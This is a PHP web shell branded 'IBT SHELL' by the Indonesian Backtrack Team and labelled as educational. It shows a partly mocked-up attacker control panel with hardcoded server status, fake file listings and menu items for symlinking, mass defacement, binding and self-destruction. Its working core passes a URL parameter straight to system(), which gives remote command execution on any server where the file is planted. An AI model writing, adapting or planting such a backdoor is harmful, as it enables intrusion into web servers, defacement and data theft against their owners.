<?php
/*
SHELL INDONESIAN BACKTRACK TEAM
AUTHOR : CEEMDE aka PARIKESIT
KURAWA IBT
DATE : 30/11/2014
COPYRIGHT : MIT LICENSE
FOR EDUCATIONAL PURPOSE
*/

session_start();
error_reporting(E_ERROR | E_PARSE);
@ini_set("max_execution_time",0);
@set_time_limit(0); #No Fx in SafeMode
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
?>

<html>
<head>
<title>IBT SHELL</title>
<style>
body{
margin:0;
background-image:url('ibt.png');
background-size:cover;
color:#fff;
letter-spacing:0.5px;
}
p{
font-size:14px;
line-height:24px;
}
table{
background:rgba(0,0,0,0.9);
}
a{
text-decoration:none;
color:red;
}
.overlay{
position:absolute;
#background:rgba(0,0,0,0.75);
width:100%;
height:100%;
left:0;
top:0;
right:0;
z-index:-1;
}
</style>
</head>
<body>




<div class="overlay"></div>
	<table width="100%" border="1" cellpadding="20px" cellspacing="0">
		<tr>
			<td>
					<p align="left"><?php 
								echo "Server Time : ".date("d-m-Y H:i:s")." (GMT + 7)<br />";
								echo "Software : ". $_SERVER['SERVER_SOFTWARE']."  ";
								echo "<a href='?action=phpinfo' target='_blank'>PHP Info</a> /"; 
								?>
								MySQL: <font color="#008000">ON</font> / 
								MSSQL: <font color="#c45333">OFF</font> / 
								Oracle: <font color="#c45333">OFF</font> / 
								PostgreSQL: <font color="#c45333">OFF</font> / 
								Curl: <font color="#008000">ON</font> 
								Sockets: <font color="#008000">ON</font> / 
								Fetch: <font color="#008000">ON</font> / 
								Wget: <font color="#008000">ON</font> / 
								Perl: <font color="#008000">ON</font> / 
								GCC: <font color="#008000">ON</font><br />
								<?php
								if(ini_get('magic_quotes_gpc') == '1'){
									echo 'Magic_quotes_gpc:<font color="red"> ON</font> <a href="?turnoff="><font color="#00ff00">Turn off</a>';
								}
								else{
									echo 'Magic_quotes_gpc:<font color="green"> OFF</font><br />';
								}
								echo "uname -a : ".php_uname()." (Check Exploit)<br />"; 	
								
								if(ini_get('safe_mode') == '1'){
									echo 'Safe mode:<font color="red"> ON </font> <a href="?turnoff=">(Turn OFF)</a> <br />';
								}
								else{
									echo 'Safe mode:<font color="green"> OFF </font><br />';
								} 
								?>
								
								<a href="?xtux=ls&amp;d=C%3A%5C&amp;sort=2d">C:\</a><a href="?xtux=ls&amp;d=C%3A%5Cxampp%5C&amp;sort=2d">xampp\</a><a href="?xtux=ls&amp;d=C%3A%5Cxampp%5Chtdocs%5C&amp;sort=2d">htdocs\</a><a href="?xtux=ls&amp;d=C%3A%5Cxampp%5Chtdocs%5Cshell%5C&amp;sort=2d">shell\</a>&nbsp;&nbsp;&nbsp;<font color="green">drwxrwxrwx</font><br>Filesystem Mounted: 42.61 GB of 97.56 GB (43.68%)
								<br>ifconfig : <a href="http://whois.domaintools.com/127.0.0.1">127.0.0.1</a> (Whois) | Port Open : [ 21,22,80,443,2082 ] | Flag : ID
								<br />Detected drives: <a href="?xtux=ls&amp;d=a%3A%5C" onclick="return confirm('Make sure this is correct.')">[ a ]</a> <a href="?xtux=ls&amp;d=c%3A%5C">[ c ]</a> <a href="?xtux=ls&amp;d=d%3A%5C">[ d ]</a> <a href="?xtux=ls&amp;d=e%3A%5C">[ e ]</a> <a href="?xtux=ls&amp;d=f%3A%5C">[ f ]</a> <br><a href="?"></a>
								Disabled Functions : None (Bypass)<br />
					</p>
			</td>
		</tr>
		<?php
			//Exec Form
			if(isset($_GET['cmd'])){
		?>
		<tr>
		<td><textarea cols="100%" rows="20" style="background:transparent;outline:none;color:#ffffff;"><?=system($_GET['cmd'])?></textarea></td>
		</tr>
		<?php
		}
		?>
		<tr>
			<td style="font-size:14px;">
			<a href="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">File</a> | 
			<a href="?action=">Mysql</a> | 
			<a href="?action=">Symlink</a> | 
			<a href="?action=">Mass Deface</a> | 
			<a href="?action=">Hasher</a> | 
			<a href="?action=">Bind</a> | 
			<a href="?action=">Terminal</a> | 
			<a href="?action=">Self-Destroy</a> | 
			<a href="?action=">Logout</a>			
			</td>
		</tr>
		<tr>
			<td>
				<table width="100%" style="background:transparent;" cellspacing="7px">
					<tr style="font-weight:bold;"><td>Nama</td><td>Size</td><td>Last Edit</td><td>Perm</td><td>Action</td></tr>
					<tr style="font-size:12px;"><td>.</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>..</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>tools/</td><td>100 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>index.php</td><td>100 KB</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
					<tr style="font-size:12px;"><td>config.php</td><td>22 B</td><td>30.11.2014 16:21:38</td><td>drwxrwxrwx(777)</td><td>Edit | Download | Delete | Rename</td></tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<table width="100%" style="font-size:14px;background:transparent;" cellpadding="20px">
					<tr>
						<td>
							Upload : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value=""/><br /><br /><input type="file" name="file" /> <input type="submit" name="submit" value="Send"/>
						</td>
						<td>
							Change Dir : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value="C:/xampp/htdocs/shell""/> <input type="submit" name="submit" value="Send"/>
						</td>
					</tr>
					<tr>
						<td>
							Make Dir : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
						</td>
						<td>
							Read File : <br /><input type="text" placeholder="/path/file.format" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
						</td>
					</tr>
					<tr>
						<td>
							Make File : <br /><input type="text" placeholder="file.format" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
						</td>
						<td>
							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
							Execute : <br /><input type="text" placeholder="Ex : dir,ls,ifconfig" name="cmd" value=""/> <input type="submit" name="submit" value="Send"/>
							</form>
						</td>
					</tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<p style="text-align:center;font-weight:bolder;">Copyright Indonesian Backtrack Team</p>
			</td>
		</tr>
	</table>

</body>
</html>